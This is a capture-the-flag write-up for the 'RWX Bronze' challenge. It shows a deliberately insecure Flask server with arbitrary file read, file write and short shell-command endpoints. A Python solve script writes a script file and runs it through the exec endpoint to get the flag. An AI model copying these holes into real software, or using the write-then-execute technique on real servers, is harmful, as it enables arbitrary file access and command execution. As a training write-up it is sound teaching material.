# RWX Bronze

The challenge is running a flask application with this backend:

```py
from flask import Flask, request, send_file
import subprocess

app = Flask(__name__)

@app.route('/read')
def read():
    filename = request.args.get('filename', '')
    try:
        return send_file(filename)
    except Exception as e:
        return str(e), 400

@app.route('/write', methods=['POST'])
def write():
    filename = request.args.get('filename', '')
    content = request.get_data()
    try:
        with open(filename, 'wb') as f:
            f.write(content)
        return 'OK'
    except Exception as e:
        return str(e), 400

@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 7:
        return 'Command too long', 400
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output
    except Exception as e:
        return str(e), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=6664)
```

We can also find a binary on the server called `would`, which has this source code:

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    char full_cmd[256] = {0}; 
    for (int i = 1; i < argc; i++) {
        strncat(full_cmd, argv[i], sizeof(full_cmd) - strlen(full_cmd) - 1);
        if (i < argc - 1) strncat(full_cmd, " ", sizeof(full_cmd) - strlen(full_cmd) - 1);
    }

    if (strstr(full_cmd, "you be so kind to provide me with a flag")) {
        FILE *flag = fopen("/flag.txt", "r");
        if (flag) {
            char buffer[1024];
            while (fgets(buffer, sizeof(buffer), flag)) {
                printf("%s", buffer);
            }
            fclose(flag);
            return 0;
        }
    }

    printf("Invalid usage: %s\n", full_cmd);
    return 1;
}
```

So basically we can do 3 things:
1. The /read endpoint allows us to read any file on the server
2. The /write endpoint allows us to write to any file on the server
3. The /exec endpoint allows us to execute commands, but they're limited to 7 characters

Our idea is to first upload a file wich will run the would command so we get the flag, and then execute it in a command of 7 or less characters. We can do it with: `sh ~/a`.

## solve.py

```py
import requests

url = "https://6057290665dbf6b6ce4ba6df0e9119eb-34914.inst2.chal-kalmarc.tf"

res = requests.post(f"{url}/write", params={'filename': '/home/user/a'}, data=b'/would "you be so kind to provide me with a flag"')
print("Write response:", res.text)
res = requests.get(f"{url}/exec", params={'cmd': 'sh ~/a'})
print("Flag:", res.text)
```
